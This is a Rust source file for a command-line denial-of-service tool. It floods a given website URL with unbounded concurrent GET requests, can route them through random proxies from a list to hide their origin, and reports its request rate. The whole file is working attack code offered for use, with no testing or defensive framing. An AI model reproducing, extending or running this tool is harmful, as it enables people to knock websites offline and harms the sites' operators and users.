#![feature(integer_atomics)]

use chrono::{Local, Timelike};
use clap::Parser;
use colored::Colorize;
use futures::stream::FuturesUnordered;
use futures::StreamExt;
use rand::Rng;

use std::fs::File;
use std::io::{self, BufRead};
use std::path::Path;
use std::sync::atomic::{AtomicU128, Ordering};
use std::sync::Arc;
use std::time::Instant;

enum WebsiteError {
    WebsiteUnaccessible,
    BadResponse,
}

/// Denial of Service attack
#[derive(Parser, Debug)]
struct Args {
    /// Website URL to attack
    #[clap(short, long)]
    url: String,

    /// Needs to use proxy servers
    #[clap(short, long, takes_value = false)]
    proxy: bool,

    /// Start DoS without website status checking
    #[clap(short, long, takes_value = false)]
    force: bool,

    /// Do not display errors
    #[clap(short, long, takes_value = false)]
    error_mode: bool,
}

struct DenialOfService {
    url: String,
    spawned_requests: AtomicU128,
}

impl DenialOfService {
    async fn attack(self: &Arc<Self>, activate_proxy: bool, error_mode: bool) {
        let start_attack_time = Instant::now();

        let cloned_self = self.clone();
        tokio::spawn(async move {
            tokio::signal::ctrl_c().await.unwrap();

            println!();
            display_time();
            println!("{}", "DoS was stoped by user".green());

            display_time();
            println!(
                "{}",
                format!(
                    "{} {} {}",
                    "Program worked for".green(),
                    format!("{:.02}", start_attack_time.elapsed().as_secs_f64() / 60.).bold(),
                    "min".green()
                )
            );

            display_time();
            println!(
                "{}",
                format!(
                    "{} {}",
                    "Average requests per second:".green(),
                    format!(
                        "{:.02}",
                        cloned_self.spawned_requests.load(Ordering::SeqCst) as f64
                            / start_attack_time.elapsed().as_secs_f64()
                    )
                    .bold()
                )
            );
            std::process::exit(1);
        });

        let mut proxies = Vec::new();
        if let Ok(lines) = read_lines("./proxies.txt") {
            for line in lines.flatten() {
                proxies.push(line);
            }
        }

        let mut spawned_tasks = FuturesUnordered::new();
        loop {
            if spawned_tasks.len() > 3000 {
                spawned_tasks.next().await;
            }

            let self_cloned = self.clone();
            if activate_proxy {
                let taken_proxy = take_random_proxy(proxies.clone());
                spawned_tasks.push(tokio::spawn(async move {
                    match reqwest::Proxy::http(taken_proxy.clone()) {
                        Ok(proxy) => match reqwest::Client::builder().proxy(proxy).build() {
                            Ok(client) => match client.get(self_cloned.url.clone()).send().await {
                                Ok(_) => {
                                    self_cloned.spawned_requests.fetch_add(1, Ordering::SeqCst);

                                    if self_cloned.spawned_requests.load(Ordering::SeqCst) % 1000
                                        == 0
                                    {
                                        display_time();

                                        let request_info = format!(
                                            "Request №{} was successfuly sent from",
                                            self_cloned.spawned_requests.load(Ordering::SeqCst),
                                        );
                                        println!("{} {}", request_info.green(), taken_proxy.bold());
                                    }
                                }
                                Err(e) => {
                                    display_error(format!("{}", e), error_mode);
                                }
                            },
                            Err(e) => {
                                display_error(format!("{}", e), error_mode);
                            }
                        },
                        Err(e) => {
                            display_error(format!("{}", e), error_mode);
                        }
                    };
                }));
            } else {
                spawned_tasks.push(tokio::spawn(async move {
                    match reqwest::get(self_cloned.url.clone()).await {
                        Ok(_) => {
                            self_cloned.spawned_requests.fetch_add(1, Ordering::SeqCst);

                            if self_cloned.spawned_requests.load(Ordering::SeqCst) % 1000 == 0 {
                                display_time();

                                let request_info = format!(
                                    "Request №{} was successfuly sent",
                                    self_cloned.spawned_requests.load(Ordering::SeqCst),
                                );
                                println!("{}", request_info.green());
                            }
                        }
                        Err(e) => {
                            display_error(format!("{}", e), error_mode);
                        }
                    }
                }));
            }
        }
    }
}

fn display_time() {
    let now = Local::now().time();
    let time = format!(
        "[{:02}:{:02}:{:02}] ",
        now.hour(),
        now.minute(),
        now.second()
    );

    print!("{} ", time.blue());
}

fn display_error(text: String, error_mode: bool) {
    if !error_mode {
        display_time();
        println!("{}", text.red().bold());
    }
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

fn take_random_proxy(proxies: Vec<String>) -> String {
    let mut rng = rand::thread_rng();

    let rand_index = rng.gen_range(0..proxies.len());
    proxies[rand_index].clone()
}

async fn website_is_up(url: String) -> Result<(), WebsiteError> {
    let response = reqwest::get(url).await;

    match response {
        Ok(response_res) => {
            if response_res.status().is_success() {
                return Ok(());
            }

            Err(WebsiteError::BadResponse)
        }
        Err(_) => Err(WebsiteError::WebsiteUnaccessible),
    }
}

async fn start_denial_of_service(url: String, activate_proxy: bool, error_mode: bool) {
    display_time();
    println!("{} {}", "DoS is running at".green(), url.clone().bold());
    Arc::new(DenialOfService {
        url: url.clone(),
        spawned_requests: AtomicU128::new(0),
    })
    .attack(activate_proxy, error_mode)
    .await
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    let website_url = args.url;
    let activate_proxy = args.proxy;
    let error_mode = args.error_mode;

    if args.force {
        start_denial_of_service(website_url.clone(), activate_proxy, error_mode).await;
    }

    match website_is_up(website_url.clone()).await {
        Ok(()) => {
            start_denial_of_service(website_url.clone(), activate_proxy, error_mode).await;
        }
        Err(WebsiteError::WebsiteUnaccessible) => {
            display_error(
                "Unable to ping website. Make sure the link is spelled correctly!".to_string(),
                error_mode,
            );
        }
        Err(WebsiteError::BadResponse) => {
            display_error(
                "GET request to the site ended with an failure response!".to_string(),
                error_mode,
            );
        }
    }
}
